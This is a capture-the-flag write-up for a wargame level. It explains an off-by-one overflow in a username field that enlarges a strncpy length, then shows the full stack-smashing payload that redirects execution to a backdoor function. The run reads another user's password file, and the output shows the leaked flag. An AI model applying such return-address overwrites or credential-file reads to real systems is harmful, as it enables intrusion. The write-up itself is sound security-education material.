## Program analysis

It's actually quite a complex program.

It basically asks for a username, which gets stored at the username pointer in the structure. Then, the user can send a message on the network. The message is retrieved and copied in teh structure as well.

There is also a `secret_backdoor` function which basically allows to run any command with the owner's permission (`end` here). So if we can do some sort of buffer overflow, and erase a place where some next instructions are stored, with the address of this backdoor, we could get to the `/home/users/level09/.pass` file.

Apparently, everything is secured : in total 180 bytes maximum are read and set in teh structure, the `strncpy` is secured with a max number of bytes to be copied (which is another attribute of the structure); same for the 40 last characters with the username.


## The vulnerability

Actually, at the username attribute, 0 to 40 **included** first chars of username are stored, which makes 41 bytes! This one byte will allow us to overflow the `len` attribute in our msg strtucture by one byte, which is enough to erase the size used in the `strncpy` (with a max value of 255).


## The exploit

1. Finding the offset : in `handle_msg`, the structure starts at 0xc0 from `$rbp`, or 192 bytes. Don't forget we are on a 64 bits processor so the next instruction of the main function (its $rip register whose value has been stored on the stack at time of calling `handle_msg`), is at 200 bytes from the buffer. In order to erase this value, we need our buffer to be at least **208 bytes** long after being filled up.

2. Hence, we know that the 41st character of our username should be 208 bytes or 0xD0. It will erase the len attribute of the structure, used in `strncpy` of the msg into the buffer.

3. Now, `msg` will be copied starting at the beginning of our structure. So its suite of 8 bytes, starting at byte 200, should be the address of the `secret_backdoor` function : `0x000055555555488c`.


## Result

```
level09@OverRide:~$ (python -c 'print("A"*40 + "\xd0")' ; python -c 'print("B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")' ; python -c 'print("cat /home/users/end/.pass")') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
level09@OverRide:~$
```

*Note : we pass as third input, the command that will get caught by the `fgets` call inside the `secret_backdoor` function : the command we want to be executed by `system`.*